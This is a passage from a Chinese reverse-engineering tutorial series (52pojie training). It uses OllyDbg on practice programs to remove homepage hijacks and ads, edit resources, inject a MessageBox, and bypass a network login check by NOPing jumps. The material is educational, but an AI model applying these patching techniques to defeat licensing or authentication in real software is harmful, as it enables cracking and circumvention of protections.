，主程序中央内置了广告，过了一会儿桌面右下角会闪出广告。</p><p>目标：取消主页修改，去除广告。</p><p>载入OD，查找字符串看看。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">地址       反汇编                                    文本字符串</span><br><span class="line">0040193D   push dumped_.004034D0                     SeDebugPrivilege</span><br><span class="line">004019E2   mov [local.14],dumped_.004034F8           SOFTWARE\microsoft\Internet Explorer\Main;微软浏览器、IE浏览器</span><br><span class="line">004019EE   mov esi,dumped_.0040354C                  http://www.52pojie.cn;广告地址</span><br><span class="line">00401A15   push dumped_.00403578                     Start Page;开始页</span><br><span class="line">00401A4B   push dumped_.00403590                     Start Page</span><br><span class="line">00401A81   push dumped_.004035A8                     Default_Page_URL;默认页</span><br><span class="line">00401B4F   push dumped_.004035CC                     我就是广告\r\n来把我干掉啊\r\n加油！;右下角的广告</span><br><span class="line">00401BA9   push dumped_.004035F4                     explorer.exe http://www.52pojie.cn/thread-384195-1-1.html</span><br><span class="line">00401C4A   push dumped_.00403630                     http://www.52pojie.cn/portal.php;主程序中间的广告</span><br><span class="line">00401DA9   push dumped_.00403674                     explorer.exe http://www.52pojie.cn/thread-384195-1-1.html</span><br></pre></td></tr></table></figure><p>先去掉IE、微软的默认广告主页。双击进去，发现整个函数都是修改浏览器的主页面。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">004019D0  /$  55            push ebp</span><br><span class="line">004019D1  |.  8BEC          mov ebp,esp</span><br><span class="line">004019D3  |.  83EC 38       sub esp,0x38</span><br><span class="line">004019D6  |.  A1 28504000   mov eax,dword ptr ds:[0x405028]</span><br><span class="line">004019DB  |.  33C5          xor eax,ebp</span><br><span class="line">004019DD  |.  8945 F8       mov [local.2],eax</span><br><span class="line">004019E0  |.  56            push esi</span><br><span class="line">004019E1  |.  57            push edi</span><br><span class="line">004019E2  |.  C745 C8 F8344&gt;mov [local.14],dumped_.004034F8          ;  SOFTWARE\microsoft\Internet Explorer\Main</span><br><span class="line">004019E9  |.  B9 0B000000   mov ecx,0xB</span><br><span class="line">004019EE  |.  BE 4C354000   mov esi,dumped_.0040354C                 ;  http://www.52pojie.cn</span><br><span class="line">004019F3  |.  8D7D CC       lea edi,[local.13]</span><br><span class="line">004019F6  |.  F3:A5         rep movs dword ptr es:[edi],dword ptr ds&gt;</span><br><span class="line">004019F8  |.  8D45 FC       lea eax,[local.1]</span><br><span class="line">004019FB  |.  50            push eax                                 ; /pHandle = NULL</span><br><span class="line">004019FC  |.  8B4D C8       mov ecx,[local.14]                       ; |</span><br><span class="line">004019FF  |.  51            push ecx                                 ; |Subkey = &quot;?粒灴粁...&quot;</span><br><span class="line">00401A00  |.  68 02000080   push 0x80000002                          ; |hKey = HKEY_LOCAL_MACHINE</span><br><span class="line">00401A05  |.  FF15 10304000 call dword ptr ds:[&lt;&amp;advapi32.#465&gt;]     ; \RegCreateKeyW</span><br><span class="line">00401A0B  |.  6A 2C         push 0x2C                                ; /BufSize = 2C (44.)</span><br><span class="line">00401A0D  |.  8D55 CC       lea edx,[local.13]                       ; |</span><br><span class="line">00401A10  |.  52            push edx                                 ; |Buffer = ntdll.KiFastSystemCallRet</span><br><span class="line">00401A11  |.  6A 01         push 0x1                                 ; |ValueType = REG_SZ</span><br><span class="line">00401A13  |.  6A 00         push 0x0                                 ; |Reserved = 0x0</span><br><span class="line">00401A15  |.  68 78354000   push dumped_.00403578                    ; |Start Page</span><br><span class="line">00401A1A  |.  8B45 FC       mov eax,[local.1]                        ; |</span><br><span class="line">00401A1D  |.  50            push eax                                 ; |hKey = 0x0</span><br><span class="line">00401A1E  |.  FF15 00304000 call dword ptr ds:[&lt;&amp;advapi32.#509&gt;]     ; \RegSetValueExW</span><br><span class="line">00401A24  |.  8B4D FC       mov ecx,[local.1]</span><br><span class="line">00401A27  |.  51            push ecx                                 ; /hKey = 0012FFB0</span><br><span class="line">00401A28  |.  FF15 08304000 call dword ptr ds:[&lt;&amp;advapi32.#459&gt;]     ; \RegCloseKey</span><br><span class="line">00401A2E  |.  8D55 FC       lea edx,[local.1]</span><br><span class="line">00401A31  |.  52            push edx                                 ; /pHandle = ntdll.KiFastSystemCallRet</span><br><span class="line">00401A32  |.  8B45 C8       mov eax,[local.14]                       ; |</span><br><span class="line">00401A35  |.  50            push eax                                 ; |Subkey = NULL</span><br><span class="line">00401A36  |.  68 01000080   push 0x80000001                          ; |hKey = HKEY_CURRENT_USER</span><br><span class="line">00401A3B  |.  FF15 10304000 call dword ptr ds:[&lt;&amp;advapi32.#465&gt;]     ; \RegCreateKeyW</span><br><span class="line">00401A41  |.  6A 2C         push 0x2C                                ; /BufSize = 2C (44.)</span><br><span class="line">00401A43  |.  8D4D CC       lea ecx,[local.13]                       ; |</span><br><span class="line">00401A46  |.  51            push ecx                                 ; |Buffer = 0012FFB0</span><br><span class="line">00401A47  |.  6A 01         push 0x1                                 ; |ValueType = REG_SZ</span><br><span class="line">00401A49  |.  6A 00         push 0x0                                 ; |Reserved = 0x0</span><br><span class="line">00401A4B  |.  68 90354000   push dumped_.00403590                    ; |Start Page</span><br><span class="line">00401A50  |.  8B55 FC       mov edx,[local.1]                        ; |</span><br><span class="line">00401A53  |.  52            push edx                                 ; |hKey = 0x7C92E4F4</span><br><span class="line">00401A54  |.  FF15 00304000 call dword ptr ds:[&lt;&amp;advapi32.#509&gt;]     ; \RegSetValueExW</span><br><span class="line">00401A5A  |.  8B45 FC       mov eax,[local.1]</span><br><span class="line">00401A5D  |.  50            push eax                                 ; /hKey = NULL</span><br><span class="line">00401A5E  |.  FF15 08304000 call dword ptr ds:[&lt;&amp;advapi32.#459&gt;]     ; \RegCloseKey</span><br><span class="line">00401A64  |.  8D4D FC       lea ecx,[local.1]</span><br><span class="line">00401A67  |.  51            push ecx                                 ; /pHandle = 0012FFB0</span><br><span class="line">00401A68  |.  8B55 C8       mov edx,[local.14]                       ; |</span><br><span class="line">00401A6B  |.  52            push edx                                 ; |Subkey = &quot;跃?&quot;</span><br><span class="line">00401A6C  |.  68 01000080   push 0x80000001                          ; |hKey = HKEY_CURRENT_USER</span><br><span class="line">00401A71  |.  FF15 10304000 call dword ptr ds:[&lt;&amp;advapi32.#465&gt;]     ; \RegCreateKeyW</span><br><span class="line">00401A77  |.  6A 2C         push 0x2C                                ; /BufSize = 2C (44.)</span><br><span class="line">00401A79  |.  8D45 CC       lea eax,[local.13]                       ; |</span><br><span class="line">00401A7C  |.  50            push eax                                 ; |Buffer = NULL</span><br><span class="line">00401A7D  |.  6A 01         push 0x1                                 ; |ValueType = REG_SZ</span><br><span class="line">00401A7F  |.  6A 00         push 0x0                                 ; |Reserved = 0x0</span><br><span class="line">00401A81  |.  68 A8354000   push dumped_.004035A8                    ; |Default_Page_URL</span><br><span class="line">00401A86  |.  8B4D FC       mov ecx,[local.1]                        ; |</span><br><span class="line">00401A89  |.  51            push ecx                                 ; |hKey = 0x12FFB0</span><br><span class="line">00401A8A  |.  FF15 00304000 call dword ptr ds:[&lt;&amp;advapi32.#509&gt;]     ; \RegSetValueExW</span><br><span class="line">00401A90  |.  8B55 FC       mov edx,[local.1]</span><br><span class="line">00401A93  |.  52            push edx                                 ; /hKey = 7C92E4F4</span><br><span class="line">00401A94  |.  FF15 08304000 call dword ptr ds:[&lt;&amp;advapi32.#459&gt;]     ; \RegCloseKey</span><br><span class="line">00401A9A  |.  5F            pop edi                                  ;  kernel32.7C817077</span><br><span class="line">00401A9B  |.  5E            pop esi                                  ;  kernel32.7C817077</span><br><span class="line">00401A9C  |.  8B4D F8       mov ecx,[local.2]                        ;  kernel32.7C817080</span><br><span class="line">00401A9F  |.  33CD          xor ecx,ebp</span><br><span class="line">00401AA1  |.  E8 380B0000   call dumped_.004025DE</span><br><span class="line">00401AA6  |.  8BE5          mov esp,ebp</span><br><span class="line">00401AA8  |.  5D            pop ebp                                  ;  kernel32.7C817077</span><br><span class="line">00401AA9  \.  C3            retn</span><br></pre></td></tr></table></figure><p>这时可以直接将第1行代码修改为<code>retn</code>，但必须保证这个<code>retn</code>与段尾的<code>retn</code>状态一致，否则会导致堆栈不平衡。或者运行到段尾，执行返回，将父函数nop掉。保存，载入新程序。</p><p>去除桌面右下角的广告。在CreateWindowExA/W、DialogBoxParamA/W下断运行。会自动停很多次，因为有很多窗口，但有些很明显不是，比如主程序还没出来就断下的肯定不是。主程序出来后要等一会儿才会出现右下角广告，所以需要等待一点时间才会断下。</p><p>最后找到堆栈窗口为这个时，是右下角广告。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">015FFF9C   00401BFB  /CALL 到 DialogBoxParamW 来自 dumped_1.00401BF5</span><br><span class="line">015FFFA0   00400000  |hInst = 00400000</span><br><span class="line">015FFFA4   00000084  |pTemplate = 0x84</span><br><span class="line">015FFFA8   00000000  |hOwner = NULL</span><br><span class="line">015FFFAC   00401B00  |DlgProc = dumped_1.00401B00</span><br><span class="line">015FFFB0   00000000  \lParam = NULL</span><br></pre></td></tr></table></figure><p>选中堆栈窗口的第1行，回车返回调用函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">00401BD0  /.  55            push ebp</span><br><span class="line">00401BD1  |.  8BEC          mov ebp,esp</span><br><span class="line">00401BD3  |.  68 204E0000   push 0x4E20                                            ; /Timeout = 20000. ms</span><br><span class="line">00401BD8  |.  FF15 60304000 call dword ptr ds:[&lt;&amp;kernel32.#SystemTimeToFileTime_83&gt;; \Sleep</span><br><span class="line">00401BDE  |.  6A 00         push 0x0                                               ; /lParam = NULL</span><br><span class="line">00401BE0  |.  68 001B4000   push dumped_1.00401B00                                 ; |DlgProc = dumped_1.00401B00</span><br><span class="line">00401BE5  |.  6A 00         push 0x0                                               ; |hOwner = NULL</span><br><span class="line">00401BE7  |.  68 84000000   push 0x84                                              ; |pTemplate = 0x84</span><br><span class="line">00401BEC  |.  6A 00         push 0x0                                               ; |/pModule = NULL</span><br><span class="line">00401BEE  |.  FF15 1C304000 call dword ptr ds:[&lt;&amp;kernel32.#GetNamedPipeHandleState&gt;; |\GetModuleHandleW</span><br><span class="line">00401BF4  |.  50            push eax                                               ; |hInst = 00400000</span><br><span class="line">00401BF5  |.  FF15 E4304000 call dword ptr ds:[&lt;&amp;user32.#160&gt;]                     ; \DialogBoxParamW</span><br><span class="line">00401BFB  |.  5D            pop ebp                                                ;  dumped_1.00401BFB</span><br><span class="line">00401BFC  \.  C3            retn</span><br></pre></td></tr></table></figure><p>整个函数的意思是sleep20s弹出广告，那就直接在开头<code>retn</code>。保存，载入新程序。</p><p>去掉中央内置广告。查找字符串跟进</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00401C4A  |.  68 30364000   push dumped_1.00403630                   ;  http://www.52pojie.cn/portal.php</span><br></pre></td></tr></table></figure><p>在数据窗口跟随<code>403630</code>，用00填充 <a href="http://www.52pojie.cn/portal.php">http://www.52pojie.cn/portal.php</a> ，保存。但是主程序还是有这个框框，只是不显示页面而已。如果想要美观一点。可以用Restorator软件，将中间的框框的“可视”取消，F8提交更改，保存。</p><img src="/posts/7cd35487/%E5%8F%AF%E8%A7%86.png" class="" title="将可视取消"><h1 id="4-修改版权和资源"><a href="#4-修改版权和资源" class="headerlink" title="4. 修改版权和资源"></a>4. 修改版权和资源</h1><p>用实例二DIY。</p><h2 id="4-1-利用资源编辑器修改版权"><a href="#4-1-利用资源编辑器修改版权" class="headerlink" title="4.1 利用资源编辑器修改版权"></a>4.1 利用资源编辑器修改版权</h2><p>同样用Restorator/ResEdit/ResHacker，修改主程序的文字信息。(因为在OD看不到主程序的文字信息)</p><img src="/posts/7cd35487/Restorator%E4%BF%AE%E6%94%B9%E7%89%88%E6%9D%83.png" class="" title="Restorator修改版权"><h2 id="4-2-利用API修改版权"><a href="#4-2-利用API修改版权" class="headerlink" title="4.2 利用API修改版权"></a>4.2 利用API修改版权</h2><p>修改右下角广告的文字信息。</p><p>SetDlgItemTextA/W：DialogBox控件设置文本</p><p>在中文搜索引擎找到关键句去到反汇编窗口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0040282F    68 181A5500     push 1_备份.00551A18                       ; 我就是广告\r\n来把我干掉啊\r\n加油！</span><br></pre></td></tr></table></figure><p>在命令窗口输入<code>d 551A18</code>定位字符串，将想要写入的文字找个网页转换成十六进制。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">62 11 4e 0d 66 2f 5e 7f 54 4a ff 0c 62 11 53 ea 66 2f 5c 0f 53 ef 72 31</span><br></pre></td></tr></table></figure><p>由于PE文件是小端序的，所以将“6211”在OD里必须“1162”存放，以此类推。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11 62 0d 4e 2f 66 7f 5e 4a 54 0c ff 11 62 ea 53 2f 66 0f 5c ef 53 31 72</span><br></pre></td></tr></table></figure><p>将多余的文字用00填充，写入的最好不要超过原本文字大小，以防产生各种问题。</p><img src="/posts/7cd35487/%E4%BF%AE%E6%94%B9%E6%96%87%E6%9C%AC.jpg" class="" title="修改文本"><h2 id="4-3-利用十六进制编辑器修改"><a href="#4-3-利用十六进制编辑器修改" class="headerlink" title="4.3 利用十六进制编辑器修改"></a>4.3 利用十六进制编辑器修改</h2><p>用C32asm/WinHEX修改。找到位置直接打16进制进去，目前我还没找到粘贴二进制数据的地方，所以只能手打。修改完后保存即可。</p><h1 id="5-汉化"><a href="#5-汉化" class="headerlink" title="5. 汉化"></a>5. 汉化</h1><p>在汉化时，要注意保留快捷键，比如&amp;D、&amp;F。</p><img src="/posts/7cd35487/%E6%B1%89%E5%8C%96.png" class="" title="汉化"><img src="/posts/7cd35487/%E6%B1%89%E5%8C%96%E5%89%8D.png" class="" title="汉化前"><img src="/posts/7cd35487/%E6%B1%89%E5%8C%96%E5%90%8E.png" class="" title="汉化后"><h1 id="6-增加弹窗"><a href="#6-增加弹窗" class="headerlink" title="6. 增加弹窗"></a>6. 增加弹窗</h1><p>用Stud_PE载入程序，在函数那里找user32模块的<code>MessageBoxA</code>函数，如果没有则右键-&gt;add new import，dll选择user32.dll的路径(在吾爱虚拟机中路径为C:\WINDOWS\system32\user32.dll)，选择<code>MessageBoxA</code>函数，添加到列表。RVA为<code>1C3173</code>。</p><img src="/posts/7cd35487/%E6%B7%BB%E5%8A%A0%E5%87%BD%E6%95%B0.png" class="" title="添加MessageBoxA"><p>在区段那里新增一个区段。原始大小、虚拟大小为1000，区段数据选择“用空字节填充区段”。区段的RVA为<code>1C4000</code>。再用OD载入去到<code>5C4000</code>处编写代码。</p><p>MeaagexBoxA有4个参数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">WINUSERAPI <span class="type">int</span> WINAPI <span class="title function_">MessageBoxA</span><span class="params">(</span></span><br><span class="line"><span class="params">HWND hWnd,<span class="comment">//获取父句柄</span></span></span><br><span class="line"><span class="params">LPCWSTR lpText,<span class="comment">//文本信息</span></span></span><br><span class="line"><span class="params">LPCWSTR lpCaption,<span class="comment">//标题</span></span></span><br><span class="line"><span class="params">UINT uType)</span>;<span class="comment">//风格</span></span><br></pre></td></tr></table></figure><p>在OD中，是从下往上push参数的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">push 0;0表示只有一个确认键</span><br><span class="line">push 地址;标题</span><br><span class="line">push 地址  ;文本</span><br><span class="line">push 0;0表示没有父句柄</span><br><span class="line">call dword ptr ds:[5C3173];MessageBoxA的VA地址</span><br></pre></td></tr></table></figure><p>地址可以是这个区段任意某个位置。标题和文本在数据窗口修改。修改完后会自动在反汇编窗口补上代码。别忘了执行完<code>MessageBoxA</code>后跳回OEP执行主程序。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp 5025A6</span><br></pre></td></tr></table></figure><p>复制到可执行文件，保存，用LoadPE或Stud_PE修改入口点为<code>1C4000</code>。</p><p>MessageBoxW一样操作。</p><img src="/posts/7cd35487/%E5%A2%9E%E5%8A%A0%E5%BC%B9%E7%AA%97.png" class="" title="增加弹窗">]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;1-了解Windows-API&quot;&gt;&lt;a href=&quot;#1-了解Windows-API&quot; class=&quot;headerlink&quot; title=&quot;1. 了解Windows API&quot;&gt;&lt;/a&gt;1. 了解Windows API&lt;/h1&gt;&lt;p&gt;消息框：MessageBoxA/W（Ansi[ASCII]/WideChar[Unicode]）&lt;/p&gt;
&lt;p&gt;弹页面：&lt;/p&gt;
&lt;p&gt;ShellExecuteA/W：open url——控制台执行&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="OllyDbg" scheme="http://example.com/tags/OllyDbg/"/>
    
    <category term="吾爱破解培训" scheme="http://example.com/tags/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD/"/>
    
  </entry>
  
  <entry>
    <title>第七课——常见的网络验证</title>
    <link href="http://example.com/posts/a4cc5112.html"/>
    <id>http://example.com/posts/a4cc5112.html</id>
    <published>2022-04-05T01:29:28.092Z</published>
    <updated>2022-04-11T05:25:53.923Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1. 基础知识"></a>1. 基础知识</h1><h2 id="1-1-协议"><a href="#1-1-协议" class="headerlink" title="1.1 协议"></a>1.1 协议</h2><p>网络验证协议分为UDP和TCP协议。</p><p>目前市面上流行的网络验证一半都是TCP协议的。</p><p>采用TCP协议程序发送数据所用API为：send，接收数据所用API为：recv</p><p>采用UDP协议程序发送数据所用API为：WSASend，接收数据所用API为：WSARecv</p><span id="more"></span><p>在分析封包时，了解程序使用的协议类型，采用相对应抓包工具。有的抓包工具只能抓到TCP协议发送的封包数据，比如用易语言网截所写的抓包工具，那种工具只能抓到TCP协议的封包。</p><h2 id="1-2-网络验证类型"><a href="#1-2-网络验证类型" class="headerlink" title="1.2 网络验证类型"></a>1.2 网络验证类型</h2><p>网络验证类型常见的为：Asp验证，PHP验证，云验证，exe程序互相通信验证。</p><p>判断验证类型的例子：</p><p>Asp验证 飘零网络验证</p><p>PHP验证 可可网络验证</p><p>云验证  注册宝网络验证</p><h2 id="1-3-课程流程"><a href="#1-3-课程流程" class="headerlink" title="1.3 课程流程"></a>1.3 课程流程</h2><p>利用新浪微博建立一个简单的未加密用户名密码验证，讲解起验证形成过程，讲解后破解(课件1)</p><p>利用新浪微博建立一个简单的加密用户名密码验证，讲解起验证形成过程，讲解后破解(课件2)</p><p>讲解易语言编译出客户端，服务端验证形成过程</p><p>未加密验证用户密码</p><p>BASE64加密验证用户密码到期时间</p><p>当程序无壳时，可以用查找字符串方法寻找敏感字符串；加壳时，可以用易语言的按钮事件：FF55FC5F5E(死码)，前提是这个程序是用易语言编写的。下断运行，F7步入就是主程序代码。</p><h1 id="2-实例"><a href="#2-实例" class="headerlink" title="2. 实例"></a>2. 实例</h1><p>这些程序都是用易语言编写的，所以也可以当作是易语言专栏吧。</p><h2 id="2-1-网页未加密"><a href="#2-1-网页未加密" class="headerlink" title="2.1 网页未加密"></a>2.1 网页未加密</h2><p>破解简单说下：</p><p>程序运行一下知道大概流程，载入OD寻找敏感字符串。发现登录成功在很大的一个循环里，登录失败在循环外。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">004025D7  |.  895D C0       |mov [local.16],ebx</span><br><span class="line">004025DA  |.  8B5D C0       |mov ebx,[local.16]</span><br><span class="line">004025DD  |.  FF33          |push dword ptr ds:[ebx]</span><br><span class="line">004025DF  |.  68 766C4800   |push 课件1_网.00486C76                     ;  到期时间：</span><br><span class="line">004025E4  |.  B9 02000000   |mov ecx,0x2</span><br><span class="line">004025E9  |.  E8 BEF4FFFF   |call 课件1_网.00401AAC</span><br><span class="line">004025EE  |.  83C4 08       |add esp,0x8</span><br><span class="line">004025F1  |.  8945 BC       |mov [local.17],eax</span><br><span class="line">004025F4  |.  6A 00         |push 0x0</span><br><span class="line">004025F6  |.  6A 00         |push 0x0</span><br><span class="line">004025F8  |.  6A 00         |push 0x0</span><br><span class="line">004025FA  |.  68 04000080   |push 0x80000004</span><br><span class="line">004025FF  |.  6A 00         |push 0x0</span><br><span class="line">00402601  |.  68 816C4800   |push 课件1_网.00486C81                     ;  登录成功</span><br><span class="line">00402606  |.  68 01030080   |push 0x80000301</span><br><span class="line">0040260B  |.  6A 00         |push 0x0</span><br><span class="line">0040260D  |.  68 00000000   |push 0x0</span><br><span class="line">00402612  |.  68 04000080   |push 0x80000004</span><br><span class="line">00402617  |.  6A 00         |push 0x0</span><br><span class="line">00402619  |.  8B45 BC       |mov eax,[local.17]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">00402655  |&gt; \83C4 0C       add esp,0xC</span><br><span class="line">00402658  |.  6A 00         push 0x0</span><br><span class="line">0040265A  |.  6A 00         push 0x0</span><br><span class="line">0040265C  |.  6A 00         push 0x0</span><br><span class="line">0040265E  |.  68 04000080   push 0x80000004</span><br><span class="line">00402663  |.  6A 00         push 0x0</span><br><span class="line">00402665  |.  68 8A6C4800   push 课件1_网.00486C8A                      ;  登录失败</span><br><span class="line">0040266A  |.  68 01030080   push 0x80000301</span><br><span class="line">0040266F  |.  6A 00         push 0x0</span><br><span class="line">00402671  |.  68 00000000   push 0x0</span><br><span class="line">00402676  |.  68 04000080   push 0x80000004</span><br><span class="line">0040267B  |.  6A 00         push 0x0</span><br><span class="line">0040267D  |.  68 936C4800   push 课件1_网.00486C93                      ;  账号密码不正确</span><br><span class="line">00402682  |.  68 04000000   push 0x4</span><br></pre></td></tr></table></figure><p>猜测登录时，程序先比对输入的用户名和某网页的所有用户名，如果存在再比对这个用户名的密码。两个都比对成功则执行登录成功的代码。</p><p>输入假用户名和假密码进入循环。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00402485  |.  50            |push eax</span><br><span class="line">00402486  |.  3BC8          |cmp ecx,eax</span><br><span class="line">00402488  |.  0F8F C7010000 |jg 课件1_网.00402655                       ;  判断输入是否为空</span><br><span class="line">0040248E  |.  8B5D D0       |mov ebx,[local.12]</span><br><span class="line">00402491  |.  E8 ADEBFFFF   |call 课件1_网.00401043</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0040250B  |.  83C4 04       |add esp,0x4</span><br><span class="line">0040250E  |&gt;  837D B8 00    |cmp [local.18],0x0</span><br><span class="line">00402512  |.  0F84 35010000 |je 课件1_网.0040264D                       ;  这个跳转跳出循环外，不能跳转</span><br><span class="line">00402518  |.  8B5D CC       |mov ebx,[local.13]</span><br><span class="line">0040251B  |.  E8 23EBFFFF   |call 课件1_网.00401043</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00402595  |.  83C4 04       |add esp,0x4</span><br><span class="line">00402598  |&gt;  837D B8 00    |cmp [local.18],0x0</span><br><span class="line">0040259C  |.  0F84 AB000000 |je 课件1_网.0040264D                       ;  这个跳转跳出循环外，不能跳转</span><br><span class="line">004025A2  |.  8B5D C8       |mov ebx,[local.14]</span><br><span class="line">004025A5  |.  E8 99EAFFFF   |call 课件1_网.00401043</span><br></pre></td></tr></table></figure><p>将这两个<code>je</code>指令都nop掉，实现破解。</p><p>但这节课的重点不是破解，而是算法流程。</p><p>载入OD，Ctrl+B输入二进制字串<code>FF 55 FC 5F 5E</code>，这是易语言的按钮事件死码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0041E18D  |&gt; \FF55 FC       call [local.1]</span><br><span class="line">0041E190  |.  5F            pop edi                                  ;  kernel32.7C817077</span><br><span class="line">0041E191  |.  5E            pop esi                                  ;  kernel32.7C817077</span><br></pre></td></tr></table></figure><p>F9运行至此处，再F9出现主程序，输入用户名和密码后点击注册，程序再次停在此处，现在F7进入call指令，就是作者编写的易语言代码处了。F8步过跟踪，到这里就是将要访问的网页压栈。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00401BD1  |.  68 FA6B4800   push 课件1_网.00486BFA                      ;  http://blog.sina.com.cn/s/blog_151e522e60102vy1h.html</span><br></pre></td></tr></table></figure><img src="/posts/a4cc5112/%E8%AE%BF%E9%97%AE%E7%BD%91%E9%A1%B5.png" class="" title="访问网页"><p>看着貌似写了一堆奇奇怪怪的东西，先不管它。回到OD继续往下，会发现信息窗口有类似于html的字符串，在信息窗口选中右键-&gt;数据窗口中跟随数值，发现这个程序的操作是把读取网页源码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">00177CF0  00 00 00 00 DF 00 00 00 3C 68 74 6D 